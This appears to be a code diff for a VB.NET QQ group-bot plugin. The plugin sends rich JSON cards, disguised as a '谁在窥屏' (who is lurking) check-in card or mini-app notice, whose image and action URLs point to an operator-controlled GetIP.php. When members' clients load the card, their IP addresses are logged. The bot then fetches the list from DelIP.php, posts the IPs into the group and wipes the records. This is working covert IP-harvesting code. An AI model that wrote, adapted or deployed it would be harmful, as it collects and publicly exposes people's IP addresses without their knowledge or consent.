@@ -49,10 +49,11 @@ Module Main
                             Next
                         End If
                     Next
-                    Dim urli = url.Replace("/", "\/") + "1.php?username=" & CLng(DateTime.UtcNow.Subtract(New DateTime(1970, 1, 1)).TotalMilliseconds) & "_" & sMsg.SenderQQ.ToString & "&url=q.qlogo.cn\/headimg_dl?dst_uin=" & sMsg.SenderQQ.ToString & "&spec=100"
+                    Dim urli = url.Replace("/", "\/") + "GetIP.php?username=" & CLng(DateTime.UtcNow.Subtract(New DateTime(1970, 1, 1)).TotalMilliseconds) & "_" & sMsg.SenderQQ.ToString & "&url=q.qlogo.cn\/headimg_dl?dst_uin=" & sMsg.SenderQQ.ToString & "&spec=100"
+
+                    '可以通过各种卡片设置访问地址
                     Dim jsonstring As String = "{""app"":""com.tencent.qq.checkin"",""desc"":"""",""view"":""checkIn"",""ver"":""1.0.0.25"",""prompt"":"""",""appID"":"""",""sourceName"":"""",""actionData"":"""",""actionData_A"":"""",""sourceUrl"":""" + url + """,""meta"":{""checkInData"":{""address"":""正在收集10秒内数据"",""cover"":{""height"":0,""url"":""http:\/\/pub.idqqimg.com\/pc\/misc\/files\/20171027\/3019a3beda364716b8803ca600bcca80.jpg"",""width"":0},""desc"":""谁在窥屏"",""hostuin"":1687820006,""id"":""union_15965948261687820006468907615"",""media_type"":0,""qunid"":""468907615"",""rank"":2,""skip_to"":1,""time"":0,""url"":""" + urli + """,""vid"":""""}},""config"":{""forward"":0,""showSender"":1},""text"":"""",""sourceAd"":""""}"
                     Dim jsonstring2 As String = "{""app"":""com.tencent.miniapp_01"",""desc"":"""",""view"":""notification"",""ver"":""1.0.0.11"",""prompt"":""【个人介绍】"",""appID"":"""",""sourceName"":"""",""actionData"":"""",""actionData_A"":"""",""sourceUrl"":"""",""meta"":{""notification"":{""appInfo"":{""appName"":""查询窥屏IP"",""appType"":4,""appid"":2307907357,""iconUrl"":""" + urli + """},""button"":[{""action"":""" + urli + """,""name"":""进入小程序查看详情""},{""action"":"""",""name"":"" TG""}],""data"":[{""title"":""提示"",""value"":""正在收集10秒内信息...""}],""emphasis_keyword"":"""",""title"":""谁在窥屏""}}} "   'http:\/\/q1.qlogo.cn\/g?b=qq&nk=1691323137&s=100
-                    'Dim jsonstring3 As String = "{ ""app"": ""com.tencent.structmsg"", ""desc"": ""音乐"", ""meta"": { ""music"": { ""action"": """", ""android_pkg_name"": """", ""app_type"": 1, ""appid"": 100497308, ""desc"": ""请等待10s"", ""jumpUrl"": """ + url + """, ""musicUrl"": ""[pic,hash=3DAF85F7DCE831623B13F26D179355B4]music.163.com\/song\/media\/outer\/url?id=66282.mp3"", ""preview"": ""【标识】"", ""sourceMsgId"": ""0"", ""source_icon"": """", ""source_url"": """", ""tag"": ""窥屏检测"", ""title"": ""正在检测~"" } }, ""prompt"": ""有新消息啦~"", ""ver"": ""0.0.0.1"", ""view"": ""music"" } "
                     API.SendGroupJSONMessage(Pinvoke.plugin_key, sMsg.ThisQQ, sMsg.MessageGroupQQ, jsonstring2, False)
                     System.Threading.Thread.Sleep(10000)
                     GetQQIP(sMsg.MessageGroupQQ, url)
@@ -68,7 +69,7 @@ Module Main
         Dim szOldIP As String = ""
         Dim wClient As New System.Net.WebClient
         Try
-            Dim results() As String = wClient.DownloadString(url + "del.php?action=FindAll").Split(New String() {vbCr & vbLf, vbLf}, StringSplitOptions.RemoveEmptyEntries)
+            Dim results() As String = wClient.DownloadString(url + "DelIP.php?action=FindAll").Split(New String() {vbCr & vbLf, vbLf}, StringSplitOptions.RemoveEmptyEntries)
             For i = 0 To results.Count - 1
                 Dim szRes As String = wClient.DownloadString(url + results(i).Trim)
                 Debug.Print(szRes)
@@ -81,7 +82,7 @@ Module Main
                 End If
             Next
             API.SendGroupMsg(Pinvoke.plugin_key, RobotQQ, szGruopId, vbNewLine + String.Join(vbNewLine, IPList), False)
-            Dim result As String = wClient.DownloadString(url + "del.php?action=DelAll")
+            Dim result As String = wClient.DownloadString(url + "DelIP.php?action=DelAll")
         Catch ex As Exception
             Debug.Print(ex.ToString)
         End Try
